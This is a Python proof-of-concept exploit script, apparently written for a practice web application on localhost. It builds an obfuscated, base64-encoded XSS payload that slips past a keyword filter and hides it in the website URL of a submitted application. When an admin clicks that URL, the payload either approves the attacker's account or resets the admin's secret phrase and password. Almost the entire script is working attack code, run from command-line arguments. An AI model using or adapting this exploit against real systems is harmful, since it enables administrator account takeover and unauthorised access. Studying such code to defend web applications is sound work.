#!/usr/bin/python3

'''
PoC: 
    <img src=x o<scriptnerror=javajavascript:script:(function(){alert(1)})()>
'''

# ATTACK 1

# Automatically creates an application using 
# the email and password supplied with a website
# url that upon being clicked by the admin 
# approves the account

# ATTACK 2

# Creates an application again, but this time
# the website url will change the admin's secret_phrase
# and password to ones of our choosing

import base64
import urllib
from requests.utils import requote_uri
import sys
import requests

# CHECK ARGUMENTS
if len(sys.argv) != 5:
	print('usage: %s target arg0 arg1 attack'%sys.argv[0])
	print('Attacks: 0, 1')
	print('  attack 0 (approve application) requires:')
	print('    arg0 => email')
	print('    arg1 => password')
	print()
	print('  attack 1 (admin take over) requires:')
	print('    arg0 => secret_phrase')
	print('    arg1 => password')
	sys.exit(-1)

host = sys.argv[1]
arg0 = sys.argv[2]
arg1 = sys.argv[3]
mode = sys.argv[4]

# JS PAYLOAD
print("[+] Generating url...")
payload = None
if mode == '0':
	payload = """
	let formData = new FormData();
	formData.append('email','"""+arg0+"""');
	fetch('http://localhost:5000/approve',{
	  method:'POST',
	  body:formData
	});
	"""
else:
	payload = """
	let h = {'Content-Type':'application/x-www-form-urlencoded'};
	fetch('http://localhost:5000/change_secret_phrase',{
	  method:'POST',
	  headers:h,
	  body:'secret_phrase="""+arg0+"""&secret_phrase2="""+arg0+"""'
	}).then(r=>{
	  fetch('http://localhost:5000/change_password',{
        method:'POST',
	    headers:h,
	    body:'secret_phrase="""+arg0+"""&password="""+arg1+"""&password2="""+arg1+"""'
	  });
	});
	"""

# TEMPLATES
url = 'http://localhost:5000/api?q=%s'
template = '<img src=x o<scriptnerror=javajavascript:script:eval(atob(\'%s\'))>'

# EVIL URL GENERATION
b64_payload = template % str(base64.b64encode(payload.encode('utf-8')),'utf-8')
final_url = requote_uri(url % b64_payload)

# APPLICATION
print("[+] Submitting application...")
email = arg0 if mode == '0' else 'bill@moody.com'

d = 'name=%s&email=%s&website=%s&secret_phrase=%s&password=%s&password2=%s' %\
    ('bmdyy',email,final_url,'bigbutts',arg1,arg1)
h = {'Content-Type':'application/x-www-form-urlencoded'}
requests.post('http://'+host+'/apply',data=d,headers=h)

print('[+] Done!')
